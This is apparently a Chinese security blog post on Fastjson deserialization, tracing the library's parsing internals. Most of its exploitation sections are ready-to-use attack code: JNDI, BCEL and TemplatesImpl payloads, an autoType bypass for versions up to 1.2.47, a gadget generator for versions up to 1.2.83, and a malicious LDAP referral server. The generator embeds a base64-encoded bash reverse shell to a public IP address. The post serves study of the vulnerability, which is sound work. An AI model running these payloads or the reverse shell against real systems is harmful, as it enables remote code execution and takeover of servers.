---
title: JAVA安全:Fastjson反序列化
---

*作者：Narcher*	*时间：2024/3/31*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

听白日梦组长讲课茅塞顿开，下边记录一下学到的知识

### 1.使用方式

Fastjson是一个开源的Java类库，可以通过序列化或反序列化，将Java对象转换成json字符串，或者将json字符串转换成Java对象。

使用方法大致如下：

```java
public class User {
    private String name;
    private int id;

    public User(){
        System.out.println("无参构造");
    }

    public User(String name, int id) {
        System.out.println("有参构造");
        this.name = name;
        this.id = id;
    }

    public String getName() {
        System.out.println("getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }

    public int getId() {
        System.out.println("getId");
        return id;
    }

    public void setId(int id) {
        System.out.println("setId");
        this.id = id;
    }
}
```

首先定义一个类，然后传入json字符串进行解析：

```java
String s = "{\"id\":\"1\",\"name\":\"lily\"}";
JSONObject jsonObject = JSON.parseObject(s);
System.out.println(jsonObject.get("name"));

// 输出:
// lily
```

结果只会打印一个lily，而当我们指定解析的类型时，就会发送以下情况：

```java
String s = "{\"id\":\"1\",\"name\":\"lily\"}";
User user = JSON.parseObject(s,User.class);
System.out.println(user.getName());

// 输出:
// 无参构造
// setId
// setName
// getName
// lily
```

可见在解析字符串的时候调用了构造器和set方法，我们还可以通过传参的方式使用@type控制解析的类型：

```java
String s = "{\"@type\":\"org.example.User\",\"id\":\"1\",\"name\":\"lily\"}";
JSONObject jsonObject = JSON.parseObject(s);
System.out.println(jsonObject);

// 输出:
// 无参构造
// setId
// setName
// getId
// getName
// {"name":"lily","id":1}
```

可见不仅调用了构造器和set方法，还调用了get方法。

（注意，此处的set方法要想触发需要有一个传参，否则不会执行）

### 2.调试

下面我们在jsonObject这里打个断点来调试看一下具体的流程：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711765173936.png" alt="1711765173936" style="zoom:50%;" />

首先进入了JSON类的parseObject方法，然后调用了parse方法进行解析，最后再强转为JSONObject方法，我们跟进看一下：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711765338506.png" alt="1711765338506" style="zoom:50%;" />

parse里边还有一个parse，并且多了个指定的解析feature值，将被解析的内容创建成一个DefaultJSONParser类的实例，然后又进行parse操作，我们继续跟进：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711765642394.png" alt="1711765642394" style="zoom:50%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711765678982.png" alt="1711765678982" style="zoom:50%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711765696385.png" alt="1711765696385" style="zoom:50%;" />

由第1292行开始之后调用第1305行的parse方法，之后会对我们的传参进行匹配，看看第一个字符是什么，我们的是左大括号，所以直接进第1325行的case LBRACE，然后在第1327行则会进行进一步的解析，解析出我们传入的key值：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711766459332.png" alt="1711766459332" style="zoom:50%;" />

之后会进入这里，如果我们的key是特殊字符，就会特殊处理，这里的DEFAULT_TYPE_KEY就是@type：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711766586679.png" alt="1711766586679" style="zoom:50%;" />

然后会在TypeUtils.loadClass中加载我们指定的类，之后进入反序列化阶段：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240425205230421.png" alt="image-20240425205230421" style="zoom:67%;" />

进入ParserConfig类的getDeserializer方法，这里是获取一些类的反序列化相关的方法，一般来说自己创建的类就会进入最后的这部分：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711770176321.png" alt="1711770176321" style="zoom:50%;" />

之后在ParserConfig类的createJavaBeanDeserializer方法中进入JavaBeanInfo类的build方法

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711770252698.png" alt="1711770252698" style="zoom:50%;" />

然后进行JavaBeanInfo的创建工作，这里涉及到指定类的构造器以及get,set方法的获取：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711770343488.png" alt="1711770343488" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711770526612.png" alt="1711770526612" style="zoom:50%;" />

之后就是使用JavaBeanDeserializer利用前边获取到的构造器以及get,set方法将json字符串反序列化成Java类对象，为了进入这部分，需要getOnly为true，需要我们在User类里边加一个get方法无对应的set方法且符合下图条件：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711803616379.png" alt="1711803616379" style="zoom:67%;" />

（这之后的部分很氵，仅供自己记忆，建议去看白日梦组长大佬的流程）

```java
private Map map;

public Map getMap(){
    System.out.println("getMap");
    return map;
}
```

之后由这里进入JavaBeanDeserializer类：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711770991564.png" alt="1711770991564" style="zoom:67%;" />

如下图所示：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1714050085597.png" alt="1714050085597" style="zoom:67%;" />

之后会回到ParserConfig类里边：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240425210251049.png" alt="image-20240425210251049" style="zoom:67%;" />

然后就是逐层跳出各个类，回到DefaultJSONParser类的parseObject方法中：

![image-20240425210503249](JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240425210503249.png)

接着就会调用获取到的反序列化器进行反序列化，在如下地方触发构造器和set方法：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711771732799.png" alt="1711771732799" style="zoom:50%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711771764883.png" alt="1711771764883" style="zoom:50%;" />

再之后就出来了，最后get方法在最后toJSON的时候调用：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711771843891.png" alt="1711771843891" style="zoom: 67%;" />

至此，Fastjson的反序列化流程差不多是走完了

### 3.利用

随便搞一个含有传参的set方法恶意类即可：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711799691900.png" alt="1711799691900" style="zoom:50%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711799718832.png" alt="1711799718832" style="zoom:50%;" />

之后指定这个类就能弹出计算器



## 正文

### 1.Fastjson 1.2.24

#### 1.1 JdbcRowSetImpl链

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711804697965.png" alt="1711804697965" style="zoom: 67%;" />

在JdbcRowSetImpl类里边有connect方法，虽然没有截全，但很容易看出里边有InitialContext和lookup，标准的jndi注入，我们接下来要通过Fastjson的方式来触发，就需要get或者set方法，最好是set方法，因为get方法实现起来比较麻烦：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711804924858.png" alt="1711804924858" style="zoom:67%;" />

有set就用set：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711804949390.png" alt="1711804949390" style="zoom:67%;" />

这样一来就能够触发jndi注入了，但还少了lookup的参数控制，我们需要找一个setDataSourceName方法：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711805025290.png" alt="1711805025290" style="zoom: 67%;" />

该方法在BaseRowSet类里，但没关系，因为JdbcRowSetImpl类继承了BaseRowSet类。下面我们直接写链子就好了：

首先指定JdbcRowSetImpl类，之后给DataSourceName和AutoCommit赋值：

```java
String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:7777/TestRef\",\"autoCommit\":true}";
JSONObject jsonObject = JSON.parseObject(s);
System.out.println(jsonObject);
```

运行之前注意用7777端口开一个ldap服务就好了（代码放在文章最后）：
<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711853866427.png" alt="1711853866427" style="zoom: 50%;" />

（此处有个坑点，就是需要确保jdk1.8的版本足够低，不然就会报错java.lang.ClassCastException: javax.naming.Reference cannot be
cast to javax.sql.DataSource）

#### 1.2 Bcel_ClassLoader链

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711855547250.png" alt="1711855547250" style="zoom:50%;" />

在com.sun.org.apache.bcel.internal.util的下面有个ClassLoader类，其loadClass方法存在动态类加载，如上图所示，大致需要我们传参以$$BCEL$$为开头，creatClass如下所示：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711855717328.png" alt="1711855717328" style="zoom:50%;" />

需要我们将要执行的代码放在$$BCEL$$后边，并Utility.encode一下，之后我们再找能够承接ClassLoader的类：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711856192470.png" alt="1711856192470" style="zoom:50%;" />

在org.apache.tomcat.dbcp.dbcp2包下的BasicDataSource类里边存在createConnectionFactory方法，里边有着Class.forName，可以通过动态类加载触发loadClass的方法，我们接下来就需要看一看能否控制driverClassName和driverClassLoader了，实际上在这个类里边确实有set方法：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711856628662.png" alt="1711856628662" style="zoom:67%;" />

但还没完，我们需要从createConnectionFactory方法往上找，找到一个get或者set方法以便于能够利用Fastjson触发链子：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711856818295.png" alt="1711856818295" style="zoom:67%;" />

发现可以往上边的createDataSource方法再往上getConnection方法触发：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711856912293.png" alt="1711856912293" style="zoom:50%;" />

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711856938205.png" alt="1711856938205" style="zoom: 50%;" />

流程找完了，我们来写链子：

其实就是先给driverClassLoader set成我们的ClassLoader，然后给driverClassName set为我们的以$$BCEL$$为开头的且encode后的恶意代码，最后利用jsonObject的toJSON触发getConnection就好了：

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.Files;

public class Test2 {
    public static void main(String[] args) throws IOException {
        Path path = Paths.get("G:\\web\\ctf_java\\Fastjson_1.2.24\\target\\classes\\org\\example\\calc.class");
        byte[] bytes = Files.readAllBytes(path);
        String code = Utility.encode(bytes,true);
        String s = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$"+code+"\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        JSONObject jsonObject = JSON.parseObject(s);
        System.out.println(jsonObject);
    }
}
```

#### 1.3 TemplatesImpl链

说是链子，实际上就是个指定的动态类加载，可以直接用来加载恶意类

```java
        //恶意类TempletaPoc转换成字节码，base64编码
        String byteCode = "xxxxxxxxxxxxxxxxxx";
        //构造TemplatesImpl的json数据，并将恶意类注入到json数据中
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String payload = "{\"@type\":\"" + NASTY_CLASS +
                "\",\"_bytecodes\":[\""+byteCode+"\"]," +
                "'_name':'TempletaPoc'," +
                "'_tfactory':{}," +
                "\"_outputProperties\":{}}\n";
        System.out.println(payload);
```

打就完了

### 2.Fastjson<=1.2.47

这里直接用的1.2.25的版本

#### 2.1绕过流程

Fastjson在1.2.24版本之后进行了一些这方面的修复，如果我们此时再打原先的链子就会报错：autoType is not support. org.apache.tomcat.dbcp.dbcp2.BasicDataSource，这是因为新版本在DefaultJSONParser类里边进行了一些修改，将原先直接loadClass的地方改成了如下所示：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711871667912.png" alt="1711871667912" style="zoom: 50%;" />

而checkAutoType方法里边则是对一些危险类进行了过滤：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711872327656.png" alt="1711872327656" style="zoom:50%;" />

但实际上还是可以绕过的，checkAutoType方法在进行我们这个能进去的黑名单校验之前，还进行了两个判断，第一个判断autoTypeSupport是否为true以及expectClass是否为空，这个由于autoTypeSupport默认为false，所以说进不去，我们不用管

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711872452078.png" alt="1711872452078" style="zoom:50%;" />

第二个判断是判断是否所指定的类名存在于缓存中，如果存在则可直接加载，从而绕过后续的黑名单校验：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711872609452.png" alt="1711872609452" style="zoom: 67%;" />

我们直接进getClassFromMapping看一下：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711872714246.png" alt="1711872714246" style="zoom:67%;" />

调用mappings赋值的地方有这些：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711872795161.png" alt="1711872795161" style="zoom:50%;" />

实际上能够给它赋值的就只有addBaseClassMappings和loadClass，因为只有这俩里边有用到put，然而经过查看可以知道，addBaseClassMappings是一个写死的方法，里边put的类都是以及写好的，无法更改，所以说我们就只能看loadClass了：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711873078895.png" alt="1711873078895" style="zoom:50%;" />

差不多这里是我们能够控制的，我们再来看看哪里调用了loadClass，并且有用：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711873184033.png" alt="1711873184033" style="zoom:50%;" />

最终发现MisCodec里的deserialze方法里边能对其传参进行控制：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711873803971.png" alt="1711873803971" style="zoom:50%;" />

而MisCodec实际上是一个反序列化器：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711873837092.png" alt="1711873837092" style="zoom:67%;" />

而在DefaultJSONParser类中对反序列化器的调用在第334行：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711873902747.png" alt="1711873902747" style="zoom: 67%;" />

getDeserializer在ParserConfig类里边，这个类会针对不同的类调用不同的反序列化器：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711874019870.png" alt="1711874019870" style="zoom:67%;" />

而调用MiscCodec这个反序列化器之后我们就可以通过控制strVal来对loadClass加载的类名进行控制了：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240331163901560.png" alt="image-20240331163901560" style="zoom:50%;" />

#### 2.2构造链子

我们需要先把类放到缓存里再拿出来反序列化，所以说需要两步：

第一步：

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711874729817.png" alt="1711874729817" style="zoom:67%;" />

首先，我们指定的类需要是一个Class.class才能调用MiscCodec这个反序列化器，所以说我们直接指定java.lang.Class就好了

其次，MiscCodec的deserialze方法这里表明传参的key值如果不为val的话就会报错，我们需要控制key为val，至于value则是我们要用的恶意类，这里直接传入com.sun.rowset.JdbcRowSetImpl

第二步：

直接把JdbcRowSetImpl链给拿过来就行了

最终结果：

```java
String s = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:7777/TestRef\",\"autoCommit\":true}}";
JSONObject jsonObject = JSON.parseObject(s);
System.out.println(jsonObject);
```

<img src="JAVA%E5%AE%89%E5%85%A8Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1711875258400.png" alt="1711875258400" style="zoom:50%;" />

执行成功

### 3.Fastjson<=1.2.83

```java
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Fastjson83 {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] genPayload(String cmd) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception{


        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", new byte[][]{genPayload("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjIxMC4xMjYuMTkxLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}")});
        setValue(templates, "_name", "aaa");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
        byte[] serialize = byteArrayOutputStream.toByteArray();
        System.out.println(Base64.getEncoder().encodeToString(serialize));

//        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
//        objectInputStream.readObject();

    }
}

```



### 4.Jndi+ldap服务器代码

（至于jndi+ldap的服务器代码，我忘记copy的哪位大佬的了，就先贴在下边，侵删）

```java
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class JNDILDAPServer {
    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8081/#TestRef"};
        int port = 7777;//指定端口

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

运行之后在恶意类所在目录上开一个8081端口的http.server即可
